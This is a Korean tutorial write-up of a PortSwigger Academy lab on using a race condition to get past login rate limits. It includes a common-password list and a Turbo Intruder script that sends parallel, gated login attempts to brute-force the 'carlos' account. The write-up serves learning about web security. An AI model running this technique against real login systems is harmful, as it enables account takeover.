---
title: Race Conditions 실습(2) - Bypassing rate limits via race conditions (PortSwigger Academy)
description: Turbo Intruder extension을 활용한 rate limits bypass
categories: [Web Security, Race Conditions, Lab]
tags: [웹 보안, 실습]
toc: true
---

# Lab: Bypassing rate limits via race conditions

Lab Link: [Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

---

## 핵심 포인트와 취약점 이해

이 lab은 **rate limits (횟수 제한)**이 있는 애플리케이션을 race condition으로 bypass 하는 방법에 대해 다룬다.

정상적인 rate limit의 흐름을 생각 해보면,  
1. 로그인 요청
2. 실패 횟수 조회 (ex: 2회 실패)
3. 비밀번호 검증 → 실패
4. 실패 카운트 +1 → 3회
5. 3회 넘으면 계정 lock

여기서 **3.비밀번호 검증 단계**와 **4.실패 카운트 증가 단계**가 동시에 일어나지 않는 다는 점이 이 lab의 핵심이다.

실습에 앞서 이번 Lab에서는 다음 password list를 사용한다:
```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

목표는 `carlos` 계정의 password를 brute-force로 알아내고 관리자 페이지 (admin panel)에 접근하는 것이다.

---

## 공격 흐름

### 1. Application 동작 확인

우선은 비밀번호 보호 기능이 어떻게 적용되어있는지 확인하기 위해 의도적으로 틀려준다.

비밀번호를 틀리게 입력하면 약 3회 이후 계정이 lock되는 것을 확인할 수 있다.

lock이 된 이후에 다른 **username**을 이용해서 로그인 하면 lock이 안되어 있는걸 볼 수 있는데,  
이는 해당 rate limit 이 **username**기준으로 적용되고 있으며 서버에서 관리되고 있음을 알 수 있다.

---

### 2. Race condition 가능성 확인

Burp Repeater에서 요청을 여러 개 복사해서 group으로 묶고 Parallel 요청으로 진행 해보겠다.
만약에 요청이 3회 이상으로 응답을 받으면 Race condition이 존재한다는 가설을 세울 수 있다.

---

### 3. Turbo Intruder 설정

Repeater에서 요청을 선택한 후 'Send to Turbo Intruder'를 클릭해준다.

`username`을 `carlos`로 변경하고 password부분을 *payload*로 설정해주자.

이후 기본 template에서 `single-packet attack`을 사용해준다.

기본 개념 part2 에서 전체적인 코드에 대한 부분은 다뤘기 때문에 바뀐부분에 대해서 설명하도록 하겠다.
PortSwigger에서는 Turbo Intruder의 저자인 James Kettle이 작성한 documentation에 대한 소개글이 있다.  
함께 참조하면 좋을것 같다.  
[Turbo Intruder: Embracing the billion-request attack](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    passwords = wordlists.clipboard
    
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

